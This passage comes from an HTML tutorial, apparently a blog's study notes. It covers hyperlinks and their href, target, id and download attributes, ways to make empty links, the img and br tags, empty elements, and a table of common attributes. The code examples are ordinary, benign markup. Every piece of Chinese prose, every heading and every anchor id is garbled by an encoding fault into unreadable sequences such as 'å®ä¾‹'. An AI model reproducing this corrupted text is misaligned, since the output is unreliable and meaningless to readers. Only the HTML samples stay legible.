<h5 id="style-ç›´æ¥åœ¨å…ƒç´ ä¸Šå®šä¹‰CSSæ ·å¼"><a href="#style-ç›´æ¥åœ¨å…ƒç´ ä¸Šå®šä¹‰CSSæ ·å¼" class="headerlink" title="style: ç›´æ¥åœ¨å…ƒç´ ä¸Šå®šä¹‰CSSæ ·å¼"></a>style: ç›´æ¥åœ¨å…ƒç´ ä¸Šå®šä¹‰CSSæ ·å¼</h5><ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; style=&quot;color: red;&quot;&gt;çº¢è‰²é“¾æ¥&lt;/a&gt;</code></pre>



<hr>
<h4 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a><strong>å®ä¾‹</strong></h4><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/&quot;&gt;è®¿é—®èœé¸Ÿæ•™ç¨‹&lt;/a&gt;</code></pre>

<p>ä¸Šé¢è¿™è¡Œä»£ç æ˜¾ç¤ºä¸ºï¼š<a href="https://www.runoob.com/">è®¿é—®èœé¸Ÿæ•™ç¨‹</a></p>
<p>ç‚¹å‡»è¿™ä¸ªè¶…é“¾æ¥ä¼šæŠŠç”¨æˆ·å¸¦åˆ°èœé¸Ÿæ•™ç¨‹çš„é¦–é¡µã€‚</p>
<p><strong>æç¤º:</strong> <em>â€œé“¾æ¥æ–‡æœ¬â€</em> ä¸å¿…ä¸€å®šæ˜¯æ–‡æœ¬ã€‚å›¾ç‰‡æˆ–å…¶ä»– HTML å…ƒç´ éƒ½å¯ä»¥æˆä¸ºé“¾æ¥ã€‚</p>
<p><strong>æ–‡æœ¬é“¾æ¥ï¼š</strong>æœ€å¸¸è§çš„é“¾æ¥ç±»å‹æ˜¯æ–‡æœ¬é“¾æ¥ï¼Œå®ƒä½¿ç”¨ <a> å…ƒç´ å°†ä¸€æ®µæ–‡æœ¬è½¬åŒ–ä¸ºå¯ç‚¹å‡»çš„é“¾æ¥ï¼Œä¾‹å¦‚ï¼š</a></p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;è®¿é—®ç¤ºä¾‹ç½‘ç«™&lt;/a&gt;</code></pre>

<p><strong>å›¾åƒé“¾æ¥ï¼š</strong>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨å›¾åƒä½œä¸ºé“¾æ¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<a> å…ƒç´ åŒ…å›´ç€ <img> å…ƒç´ ã€‚ä¾‹å¦‚ï¼š</a></p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;
  &lt;img src=&quot;example.jpg&quot; alt=&quot;ç¤ºä¾‹å›¾ç‰‡&quot;&gt;
&lt;/a&gt;</code></pre>

<p><strong>é”šç‚¹é“¾æ¥ï¼š</strong>é™¤äº†é“¾æ¥åˆ°å…¶ä»–ç½‘é¡µå¤–ï¼Œæ‚¨è¿˜å¯ä»¥åœ¨åŒä¸€é¡µé¢å†…åˆ›å»ºå†…éƒ¨é“¾æ¥ï¼Œè¿™ç§°ä¸ºé”šç‚¹é“¾æ¥ã€‚è¦åˆ›å»ºé”šç‚¹é“¾æ¥ï¼Œéœ€è¦åœ¨ç›®æ ‡ä½ç½®ä½¿ç”¨ <a> å…ƒç´ å®šä¹‰ä¸€ä¸ªæ ‡è®°ï¼Œå¹¶ä½¿ç”¨#ç¬¦å·å¼•ç”¨è¯¥æ ‡è®°ã€‚ä¾‹å¦‚ï¼š</a></p>
<pre><code class="highlight plaintext">&lt;a href=&quot;#section2&quot;&gt;è·³è½¬åˆ°ç¬¬äºŒéƒ¨åˆ†&lt;/a&gt;
&lt;!-- åœ¨é¡µé¢ä¸­çš„æŸä¸ªä½ç½® --&gt;
&lt;a name=&quot;section2&quot;&gt;&lt;/a&gt;</code></pre>

<p><strong>ä¸‹è½½é“¾æ¥ï¼š</strong>å¦‚æœæ‚¨å¸Œæœ›é“¾æ¥ç”¨äºä¸‹è½½æ–‡ä»¶è€Œä¸æ˜¯å¯¼èˆªåˆ°å¦ä¸€ä¸ªç½‘é¡µï¼Œå¯ä»¥ä½¿ç”¨ download å±æ€§ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;document.pdf&quot; download&gt;ä¸‹è½½æ–‡æ¡£&lt;/a&gt;</code></pre>

<hr>
<h4 id="HTML-é“¾æ¥-target-å±æ€§"><a href="#HTML-é“¾æ¥-target-å±æ€§" class="headerlink" title="HTML é“¾æ¥ - target å±æ€§"></a>HTML é“¾æ¥ - target å±æ€§</h4><p>ä½¿ç”¨ target å±æ€§ï¼Œä½ å¯ä»¥å®šä¹‰è¢«é“¾æ¥çš„æ–‡æ¡£åœ¨ä½•å¤„æ˜¾ç¤ºã€‚</p>
<p>ä¸‹é¢çš„è¿™è¡Œä¼šåœ¨æ–°çª—å£æ‰“å¼€æ–‡æ¡£ï¼š</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;è®¿é—®èœé¸Ÿæ•™ç¨‹!&lt;/a&gt;</code></pre>

<hr>
<h4 id="HTML-é“¾æ¥-id-å±æ€§"><a href="#HTML-é“¾æ¥-id-å±æ€§" class="headerlink" title="HTML é“¾æ¥- id å±æ€§"></a>HTML é“¾æ¥- id å±æ€§</h4><p>id å±æ€§å¯ç”¨äºåˆ›å»ºä¸€ä¸ª HTML æ–‡æ¡£ä¹¦ç­¾ã€‚</p>
<p><strong>æç¤º:</strong> ä¹¦ç­¾ä¸ä¼šä»¥ä»»ä½•ç‰¹æ®Šæ–¹å¼æ˜¾ç¤ºï¼Œå³åœ¨ HTML é¡µé¢ä¸­æ˜¯ä¸æ˜¾ç¤ºçš„ï¼Œæ‰€ä»¥å¯¹äºè¯»è€…æ¥è¯´æ˜¯éšè—çš„ã€‚</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<p>åœ¨HTMLæ–‡æ¡£ä¸­æ’å…¥ID:</p>
<pre><code class="highlight plaintext">&lt;a id=&quot;tips&quot;&gt;æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†&lt;/a&gt;</code></pre>

<p>åœ¨HTMLæ–‡æ¡£ä¸­åˆ›å»ºä¸€ä¸ªé“¾æ¥åˆ°â€æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†(id&#x3D;â€tipsâ€ï¼‰â€ï¼š</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;#tips&quot;&gt;è®¿é—®æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†&lt;/a&gt;</code></pre>

<p>æˆ–è€…ï¼Œä»å¦ä¸€ä¸ªé¡µé¢åˆ›å»ºä¸€ä¸ªé“¾æ¥åˆ°â€æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†(id&#x3D;â€tipsâ€ï¼‰â€ï¼š</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/html/html-links.html#tips&quot;&gt;
è®¿é—®æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†&lt;/a&gt;</code></pre>

<hr>
<h4 id="ç©ºé“¾æ¥"><a href="#ç©ºé“¾æ¥" class="headerlink" title="ç©ºé“¾æ¥"></a>ç©ºé“¾æ¥</h4><p>ä»¥ä¸‹æ˜¯å¸¸è§çš„å‡ ç§è®¾ç½®ç©ºé“¾æ¥çš„æ–¹æ³•ï¼Œä»¥åŠå®ƒä»¬ä¹‹é—´çš„åŒºåˆ«ï¼š</p>
<table>
<thead>
<tr>
<th align="left">æ–¹æ³•</th>
<th align="left">ä½œç”¨</th>
<th align="left">æ˜¯å¦ä¼šè·³è½¬</th>
<th align="left">åœºæ™¯é€‚ç”¨æ€§</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>href=&quot;#&quot;</code></td>
<td align="left">å¯¼èˆªåˆ°é¡µé¢é¡¶éƒ¨</td>
<td align="left">æ˜¯</td>
<td align="left">å ä½ç¬¦ï¼Œæ•è·ç‚¹å‡»äº‹ä»¶</td>
</tr>
<tr>
<td align="left"><code>href=&quot;javascript:void(0)&quot;</code></td>
<td align="left">é˜»æ­¢é»˜è®¤è¡Œä¸ºï¼Œä¸åˆ·æ–°é¡µé¢</td>
<td align="left">å¦</td>
<td align="left">é˜»æ­¢è·³è½¬ï¼Œé…åˆ JS ä½¿ç”¨</td>
</tr>
<tr>
<td align="left"><code>href=&quot;&quot;</code></td>
<td align="left">åˆ·æ–°å½“å‰é¡µé¢</td>
<td align="left">æ˜¯</td>
<td align="left">éœ€è¦é¡µé¢åˆ·æ–°æ—¶</td>
</tr>
<tr>
<td align="left"><code>href=&quot;about:blank&quot;</code></td>
<td align="left">æ‰“å¼€ç©ºç™½é¡µé¢</td>
<td align="left">æ˜¯</td>
<td align="left">æ–°çª—å£æ‰“å¼€ç©ºç™½é¡µé¢</td>
</tr>
<tr>
<td align="left"><code>role=&quot;button&quot;</code></td>
<td align="left">é“¾æ¥è¡¨ç°ä¸ºæŒ‰é’®ï¼Œæ— é»˜è®¤è¡Œä¸º</td>
<td align="left">å¦</td>
<td align="left">é…åˆ JS å®ç°æŒ‰é’®åŠŸèƒ½ï¼Œæ— è·³è½¬</td>
</tr>
</tbody></table>
<hr>
<h4 id="åŸºæœ¬çš„æ³¨æ„äº‹é¡¹-æœ‰ç”¨çš„æç¤º"><a href="#åŸºæœ¬çš„æ³¨æ„äº‹é¡¹-æœ‰ç”¨çš„æç¤º" class="headerlink" title="åŸºæœ¬çš„æ³¨æ„äº‹é¡¹ - æœ‰ç”¨çš„æç¤º"></a>åŸºæœ¬çš„æ³¨æ„äº‹é¡¹ - æœ‰ç”¨çš„æç¤º</h4><p><strong>æ³¨é‡Šï¼š</strong> è¯·å§‹ç»ˆå°†æ­£æ–œæ æ·»åŠ åˆ°å­æ–‡ä»¶å¤¹ã€‚å‡å¦‚è¿™æ ·ä¹¦å†™é“¾æ¥ï¼šhref&#x3D;â€<a href="https://www.runoob.com/html%22%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%90%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BA%A7%E7%94%9F%E4%B8%A4%E6%AC%A1">https://www.runoob.com/html&quot;ï¼Œå°±ä¼šå‘æœåŠ¡å™¨äº§ç”Ÿä¸¤æ¬¡</a> HTTP è¯·æ±‚ã€‚è¿™æ˜¯å› ä¸ºæœåŠ¡å™¨ä¼šæ·»åŠ æ­£æ–œæ åˆ°è¿™ä¸ªåœ°å€ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªæ–°çš„è¯·æ±‚ï¼Œå°±åƒè¿™æ ·ï¼šhref&#x3D;â€<a href="https://www.runoob.com/html/%22%E3%80%82">https://www.runoob.com/html/&quot;ã€‚</a></p>
<h3 id="HTML-å›¾åƒ"><a href="#HTML-å›¾åƒ" class="headerlink" title="HTML å›¾åƒ"></a><strong>HTML å›¾åƒ</strong></h3><p>HTML å›¾åƒæ˜¯é€šè¿‡æ ‡ç­¾ <code>&lt;img&gt; </code>æ¥å®šä¹‰çš„.</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight plaintext">&lt;img src=&quot;images/logo.png&quot; width=&quot;258&quot; height=&quot;39&quot; /&gt;</code></pre>

<p><strong>æ³¨æ„ï¼š</strong> å›¾åƒçš„åç§°å’Œå°ºå¯¸æ˜¯ä»¥å±æ€§çš„å½¢å¼æä¾›çš„ã€‚</p>
<h3 id="HTMLæ¢è¡Œ"><a href="#HTMLæ¢è¡Œ" class="headerlink" title="HTMLæ¢è¡Œ"></a><strong>HTMLæ¢è¡Œ</strong></h3><p>HTMLæ¢è¡Œæ˜¯é€šè¿‡<code>&lt;br&gt;</code> æ¥å®šä¹‰çš„</p>
<p>å¦‚æœæ‚¨å¸Œæœ›åœ¨ä¸äº§ç”Ÿä¸€ä¸ªæ–°æ®µè½çš„æƒ…å†µä¸‹è¿›è¡Œæ¢è¡Œï¼ˆæ–°è¡Œï¼‰ï¼Œè¯·ä½¿ç”¨ <code>&lt;br&gt;</code> æ ‡ç­¾ï¼š</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>è¿™ä¸ª<span class="tag">&lt;<span class="name">br</span>&gt;</span>æ®µè½<span class="tag">&lt;<span class="name">br</span>&gt;</span>æ¼”ç¤ºäº†åˆ†è¡Œçš„æ•ˆæœ<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>

<p><code>&lt;br /&gt;</code> å…ƒç´ æ˜¯ä¸€ä¸ªç©ºçš„ HTML å…ƒç´ ã€‚ç”±äºå…³é—­æ ‡ç­¾æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œå› æ­¤å®ƒæ²¡æœ‰ç»“æŸæ ‡ç­¾ã€‚</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316094200892.png" alt="image-20250316094200892"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316094136106.png" alt="image-20250316094136106"></p>
<pre><code class="highlight plaintext">åŒºåˆ†ä¸€ä¸‹ï¼š &lt;br&gt;, &lt;br/&gt; ä»¥åŠ &lt;br /&gt;ï¼ˆå¸¦æœ‰ç©ºæ ¼ï¼‰

&lt;br&gt; æ˜¯ HTML å†™æ³•ã€‚&lt;br/&gt;æ˜¯ XHTML1.1 çš„å†™æ³•, ä¹Ÿæ˜¯ XML å†™æ³•ã€‚&lt;br /&gt; æ˜¯ XHTML ä¸ºå…¼å®¹ HTML çš„å†™æ³•,ä¹Ÿæ˜¯ XML å†™æ³•ã€‚HTML5 å› ä¸ºå…¼å®¹ XHTMLï¼Œæ‰€ä»¥ä¸‰ç§å†™æ³•éƒ½å¯ä»¥ä½¿ç”¨ã€‚

æ—©æœŸå‘å¸ƒçš„ HTML è§„èŒƒå½“ä¸­ï¼Œ&lt;br&gt; ä¸ &lt;img&gt; ç­‰å…ƒç´ æ˜¯ä¸ç”¨å°é—­è‡ªèº«çš„ï¼Œä½†æ˜¯è¿™ç§å…ƒç´ é€ æˆäº† HTML è§„èŒƒçš„ä¸ä¸¥è°¨ï¼Œäºæ˜¯åœ¨ä¹‹åå‘å¸ƒçš„ XHTML è¯­è¨€ä¸­ï¼Œå‚è€ƒäº†æ›´ä¸ºä¸¥è°¨çš„ XML è§„èŒƒï¼Œåœ¨è¿™äº›ä¸ç”¨è‡ªèº«å°é—­çš„å…ƒç´ ååŠ  / æ¥è¡¨ç¤ºè‡ªè¡Œå°é—­ï¼Œåœ¨é€»è¾‘ä¸Šæ¥è®²ç­‰åŒäº&lt;br&gt;....&lt;/br&gt;ï¼ˆä½†æ˜¯æ²¡æœ‰ &lt;/br&gt; è¿™ç§å†™æ³•ï¼‰ï¼Œè¿™æ ·ä¸€æ¥ä¿è¯äº†è¾ƒå°‘çš„ä»£ç é‡ï¼ŒäºŒæ¥ä¿è¯äº†è§„èŒƒçš„ä¸¥è°¨ã€‚</code></pre>

<h3 id="HTML-ç©ºå…ƒç´ "><a href="#HTML-ç©ºå…ƒç´ " class="headerlink" title="HTML ç©ºå…ƒç´ "></a><strong>HTML ç©ºå…ƒç´ </strong></h3><p>æ²¡æœ‰å†…å®¹çš„ HTML å…ƒç´ è¢«ç§°ä¸ºç©ºå…ƒç´ ã€‚ç©ºå…ƒç´ æ˜¯åœ¨å¼€å§‹æ ‡ç­¾ä¸­å…³é—­çš„ã€‚</p>
<p><code>&lt;br&gt;</code> å°±æ˜¯æ²¡æœ‰å…³é—­æ ‡ç­¾çš„ç©ºå…ƒç´ ï¼ˆ<code>&lt;br&gt;</code> æ ‡ç­¾å®šä¹‰æ¢è¡Œï¼‰ã€‚</p>
<p>åœ¨ XHTMLã€XML ä»¥åŠæœªæ¥ç‰ˆæœ¬çš„ HTML ä¸­ï¼Œæ‰€æœ‰å…ƒç´ éƒ½å¿…é¡»è¢«å…³é—­ã€‚</p>
<p>åœ¨å¼€å§‹æ ‡ç­¾ä¸­æ·»åŠ æ–œæ ï¼Œæ¯”å¦‚<code> &lt;br /&gt;</code>ï¼Œæ˜¯å…³é—­ç©ºå…ƒç´ çš„æ­£ç¡®æ–¹æ³•ï¼ŒHTMLã€XHTML å’Œ XML éƒ½æ¥å—è¿™ç§æ–¹å¼ã€‚</p>
<p>å³ä½¿<code> &lt;br&gt;</code> åœ¨æ‰€æœ‰æµè§ˆå™¨ä¸­éƒ½æ˜¯æœ‰æ•ˆçš„ï¼Œä½†ä½¿ç”¨ <code>&lt;br /&gt;</code> å…¶å®æ˜¯æ›´é•¿è¿œçš„ä¿éšœã€‚</p>
<blockquote>
<p>[!TIP]</p>
<p>å³ä½¿å¿˜è®°ä½¿ç”¨ç»“æŸæ ‡ç­¾ï¼Œå¤§éƒ¨åˆ†æµè§ˆå™¨ä¹Ÿä¼šæ­£ç¡®åœ°æ˜¾ç¤ºHTMLï¼Œä½†æ˜¯ä¾èµ–è¿™ç§åšæ³•(æŒ‡ä¸è¦å½“æ‡’ç‹—)ï¼Œæœ€å¥½é—­åˆä¸€ä¸‹æ ‡ç­¾ï¼Œå¿˜è®°ä½¿ç”¨ç»“æŸæ ‡ç­¾ä¼šäº§ç”Ÿä¸å¯é¢„æ–™çš„ç»“æœæˆ–é”™è¯¯</p>
</blockquote>
<p><strong>tip</strong>ï¼šå¯ä»¥çš„è¯å»ºè®®ä½¿ç”¨å°å†™æ ‡ç­¾</p>
<h2 id="HTMLå±æ€§"><a href="#HTMLå±æ€§" class="headerlink" title="HTMLå±æ€§"></a>HTMLå±æ€§</h2><p>å±æ€§æ˜¯ HTML å…ƒç´ æä¾›çš„é™„åŠ ä¿¡æ¯ã€‚</p>
<p>å±æ€§é€šå¸¸å‡ºç°åœ¨ HTML æ ‡ç­¾çš„å¼€å§‹æ ‡ç­¾ä¸­ï¼Œç”¨äºå®šä¹‰å…ƒç´ çš„è¡Œä¸ºã€æ ·å¼ã€å†…å®¹æˆ–å…¶ä»–ç‰¹æ€§ã€‚</p>
<p>å±æ€§æ€»æ˜¯ä»¥ <strong>name&#x3D;â€valueâ€</strong> çš„å½¢å¼å†™åœ¨æ ‡ç­¾å†…ï¼Œ<strong>name</strong> æ˜¯å±æ€§çš„åç§°ï¼Œ<strong>value</strong> æ˜¯å±æ€§çš„å€¼ã€‚</p>
<hr>
<p><strong>HTML å±æ€§</strong></p>
<ul>
<li>HTML å…ƒç´ å¯ä»¥è®¾ç½®<strong>å±æ€§</strong></li>
<li>å±æ€§å¯ä»¥åœ¨å…ƒç´ ä¸­æ·»åŠ <strong>é™„åŠ ä¿¡æ¯</strong></li>
<li>å±æ€§ä¸€èˆ¬æè¿°äº<strong>å¼€å§‹æ ‡ç­¾</strong></li>
<li>å±æ€§æ€»æ˜¯ä»¥åç§°&#x2F;å€¼å¯¹çš„å½¢å¼å‡ºç°ï¼Œ**æ¯”å¦‚ï¼šname&#x3D;â€valueâ€**ã€‚</li>
</ul>
<hr>
<p>å±æ€§å®ä¾‹</p>
<p>HTML é“¾æ¥ç”± <a> æ ‡ç­¾å®šä¹‰ã€‚é“¾æ¥çš„åœ°å€åœ¨ <strong>href å±æ€§</strong>ä¸­æŒ‡å®šï¼š</a></p>
<p>å®ä¾‹</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;http://www.runoob.com&quot;&gt;è¿™æ˜¯ä¸€ä¸ªé“¾æ¥&lt;/a&gt;</code></pre>

<hr>
<p><strong>HTML å±æ€§å¸¸ç”¨å¼•ç”¨å±æ€§å€¼</strong></p>
<p>å±æ€§å€¼åº”è¯¥å§‹ç»ˆè¢«åŒ…æ‹¬åœ¨å¼•å·å†…ã€‚</p>
<p>åŒå¼•å·æ˜¯æœ€å¸¸ç”¨çš„ï¼Œä¸è¿‡ä½¿ç”¨å•å¼•å·ä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚</p>
<p>ä½¿ç”¨åŒå¼•å·ï¼š</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com&quot;&gt;Link&lt;/a&gt;</code></pre>

<p>ä½¿ç”¨å•å¼•å·ï¼š</p>
<pre><code class="highlight plaintext">&lt;a href=&#x27;https://www.runoob.com&#x27;&gt;Link&lt;/a&gt;</code></pre>

<p>å±æ€§å€¼åŒ…å«å¼•å·ï¼š <code>Link</code></p>
<blockquote>
<p><strong>æç¤º:</strong> åœ¨æŸäº›ä¸ªåˆ«çš„æƒ…å†µä¸‹ï¼Œæ¯”å¦‚å±æ€§å€¼æœ¬èº«å°±å«æœ‰åŒå¼•å·ï¼Œé‚£ä¹ˆæ‚¨å¿…é¡»ä½¿ç”¨å•å¼•å·ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="highlight plaintext">name=&#x27;John &quot;ShotGun&quot; Nelson&#x27;</code></pre>

<p>æˆ–è€…ï¼š</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com?q=&#x27;search&#x27;&quot;&gt;Link&lt;/a&gt;</code></pre>
</blockquote>
<hr>
<p><strong>HTML æç¤ºï¼šä½¿ç”¨å°å†™å±æ€§</strong></p>
<p>å±æ€§å’Œå±æ€§å€¼å¯¹å¤§å°å†™ä¸æ•æ„Ÿã€‚</p>
<p>ä¸è¿‡ï¼Œä¸‡ç»´ç½‘è”ç›Ÿåœ¨å…¶ HTML 4 æ¨èæ ‡å‡†ä¸­æ¨èå°å†™çš„å±æ€§&#x2F;å±æ€§å€¼ã€‚</p>
<p>è€Œæ–°ç‰ˆæœ¬çš„ (X)HTML è¦æ±‚ä½¿ç”¨å°å†™å±æ€§ã€‚</p>
<hr>
<p><strong>HTML å±æ€§å‚è€ƒæ‰‹å†Œ</strong></p>
<p>æŸ¥çœ‹å®Œæ•´çš„HTMLå±æ€§åˆ—è¡¨: <a href="https://www.runoob.com/tags/html-reference.html">HTML æ ‡ç­¾å‚è€ƒæ‰‹å†Œ</a>ã€‚</p>
<p>ä¸‹é¢åˆ—å‡ºäº†é€‚ç”¨äºå¤§å¤šæ•° HTML å…ƒç´ çš„å±æ€§ï¼š</p>
<table>
<thead>
<tr>
<th align="left">å±æ€§å</th>
<th align="left">é€‚ç”¨å…ƒç´ </th>
<th align="left">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>id</code></td>
<td align="left">æ‰€æœ‰å…ƒç´ </td>
<td align="left">ä¸ºå…ƒç´ æŒ‡å®šå”¯ä¸€çš„æ ‡è¯†ç¬¦ã€‚</td>
</tr>
<tr>
<td align="left"><code>class</code></td>
<td align="left">æ‰€æœ‰å…ƒç´ </td>
<td align="left">ä¸ºå…ƒç´ æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªç±»åï¼Œç”¨äº CSS æˆ– JavaScript é€‰æ‹©ã€‚</td>
</tr>
<tr>
<td align="left"><code>style</code></td>
<td align="left">æ‰€æœ‰å…ƒç´ </td>
<td align="left">ç›´æ¥åœ¨å…ƒç´ ä¸Šåº”ç”¨ CSS æ ·å¼ã€‚</td>
</tr>
<tr>
<td align="left"><code>title</code></td>
<td align="left">æ‰€æœ‰å…ƒç´ </td>
<td align="left">ä¸ºå…ƒç´ æä¾›é¢å¤–çš„æç¤ºä¿¡æ¯ï¼Œé€šå¸¸åœ¨é¼ æ ‡æ‚¬åœæ—¶æ˜¾ç¤ºã€‚</td>
</tr>
<tr>
<td align="left"><code>data-*</code></td>
<td align="left">æ‰€æœ‰å…ƒç´ </td>
<td align="left">ç”¨äºå­˜å‚¨è‡ªå®šä¹‰æ•°æ®ï¼Œé€šå¸¸é€šè¿‡ JavaScript è®¿é—®ã€‚</td>
</tr>
<tr>
<td align="left"><code>href</code></td>
<td align="left"><code>&lt;a&gt;</code>, <code>&lt;link&gt;</code></td>
<td align="left">æŒ‡å®šé“¾æ¥çš„ç›®æ ‡ URLã€‚</td>
</tr>
<tr>
<td align="left"><code>src</code></td>
<td align="left"><code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code></td>
<td align="left">æŒ‡å®šå¤–éƒ¨èµ„æºï¼ˆå¦‚å›¾ç‰‡ã€è„šæœ¬ã€æ¡†æ¶ï¼‰çš„ URLã€‚</td>
</tr>
<tr>
<td align="left"><code>alt</code></td>
<td align="left"><code>&lt;img&gt;</code></td>
<td align="left">ä¸ºå›¾åƒæä¾›æ›¿ä»£æ–‡æœ¬ï¼Œå½“å›¾åƒæ— æ³•æ˜¾ç¤ºæ—¶æ˜¾ç¤ºã€‚</td>
</tr>
<tr>
<td align="left"><code>type</code></td>
<td align="left"><code>&lt;input&gt;</code>, <code>&lt;button&gt;</code></td>
<td align="left">æŒ‡å®šè¾“å…¥æ§ä»¶çš„ç±»å‹ï¼ˆå¦‚ <code>text</code>, <code>password</code>, <code>checkbox</code> ç­‰ï¼‰ã€‚</td>
</tr>
<tr>
<td align="left"><code>value</code></td>
<td align="left"><code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;option&gt;</code></td>
<td align="left">æŒ‡å®šå…ƒç´ çš„åˆå§‹å€¼ã€‚</td>
</tr>
<tr>
<td align="left"><code>disabled</code></td>
<td align="left">è¡¨å•å…ƒç´ </td>
<td align="left">ç¦ç”¨å…ƒç´ ï¼Œä½¿å…¶ä¸å¯äº¤äº’ã€‚</td>
</tr>
<tr>
<td align="left"><code>checked</code></td>
<td align="left"><code>&lt;input type=&quot;checkbox&quot;&gt;</code>, <code>&lt;input type=&quot;radio&quot;&gt;</code></td>
<td align="left">æŒ‡å®šå¤é€‰æ¡†æˆ–å•é€‰æŒ‰é’®æ˜¯å¦è¢«é€‰ä¸­ã€‚</td>
</tr>
<tr>
<td align="left"><code>placeholder</code></td>
<td align="left"><code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code></td>
<td align="left">åœ¨è¾“å…¥æ¡†ä¸­æ˜¾ç¤ºæç¤ºæ–‡æœ¬ã€‚</td>
</tr>
<tr>
<td align="left"><code>target</code></td>
<td align="left"><code>&lt;a&gt;</code>, <code>&lt;form&gt;</code></td>
<td align="left">æŒ‡å®šé“¾æ¥æˆ–è¡¨å•æäº¤çš„ç›®æ ‡çª—å£æˆ–æ¡†æ¶ï¼ˆå¦‚ <code>_blank</code> è¡¨ç¤ºæ–°æ ‡ç­¾é¡µï¼‰ã€‚</td>
</tr>
<tr>
<td align="left"><code>readonly</code></td>
<td align="left">è¡¨å•å…ƒç´ </td>
<td align="left">ä½¿è¾“å…¥æ¡†åªè¯»ã€‚</td>
</tr>
<tr>
<td align="left"><code>required</code></td>
<td align="left">è¡¨å•å…ƒç´ </td>
<td align="left">æŒ‡å®šè¾“å…¥å­—æ®µä¸ºå¿…å¡«é¡¹ã€‚</td>
</tr>
<tr>
<td align="left"><code>autoplay</code></td>
<td align="left"><code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code></td>
<td align="left">è‡ªåŠ¨æ’­æ”¾åª’ä½“ã€‚</td>
</tr>
<tr>
<td align="left"><code>onclick</code></td>
<td align="left">æ‰€æœ‰å…ƒç´ </td>
<td align="left">å½“ç”¨æˆ·ç‚¹å‡»å…ƒç´ æ—¶è§¦å‘ JavaScript äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td align="left"><code>onmouseover</code></td>
<td align="left">æ‰€æœ‰å…ƒç´ </td>
<td align="left">å½“ç”¨æˆ·å°†é¼ æ ‡æ‚¬åœåœ¨å…ƒç´ ä¸Šæ—¶è§¦å‘ JavaScript äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td align="left"><code>onchange</code></td>
<td align="left">è¡¨å•å…ƒç´ </td>
<td align="left">å½“å…ƒç´ çš„å€¼å‘ç”Ÿå˜åŒ–æ—¶è§¦å‘ JavaScript äº‹ä»¶ã€‚</td>
</tr>
</tbody></table>
<h3 id="å…¨å±€å±æ€§"><a href="#å…¨å±€å±æ€§" class="headerlink" title="å…¨å±€å±æ€§"></a>å…¨å±€å±æ€§</h3><p>å…¨å±€å±æ€§æ˜¯æ‰€æœ‰ HTML å…ƒç´ éƒ½å¯ä»¥ä½¿ç”¨çš„å±æ€§ã€‚</p>
<p><strong>id</strong>ï¼šä¸ºå…ƒç´ æŒ‡å®šå”¯ä¸€çš„æ ‡è¯†ç¬¦ã€‚(åŸºäº<code>css</code>çš„å±æ€§,çº¯ç²¹ä½¿ç”¨&lt; DIV &gt;æ ‡ç­¾è€Œä¸åŠ ä»»ä½•CSSå†…å®¹ï¼Œå…¶æ•ˆæœä¸ç”¨&lt; p&gt;&lt; &#x2F;p &gt;æ˜¯ä¸€æ ·çš„ã€‚)</p>
<pre><code class="highlight plaintext">&lt;div id=&quot;header&quot;&gt;This is the header&lt;/div&gt;</code></pre>

<p><strong>class</strong>ï¼šä¸ºå…ƒç´ æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªç±»åï¼Œç”¨äº CSS æˆ– JavaScript é€‰æ‹©ã€‚</p>
<pre><code class="highlight plaintext">&lt;p class=&quot;text highlight&quot;&gt;This is a highlighted text.&lt;/p&gt;</code></pre>

<p><strong>style</strong>ï¼šç”¨äºç›´æ¥åœ¨å…ƒç´ ä¸Šåº”ç”¨ CSS æ ·å¼ã€‚</p>
<pre><code class="highlight plaintext">&lt;p style=&quot;color: blue; font-size: 14px;&quot;&gt;This is a styled paragraph.&lt;/p&gt;</code></pre>

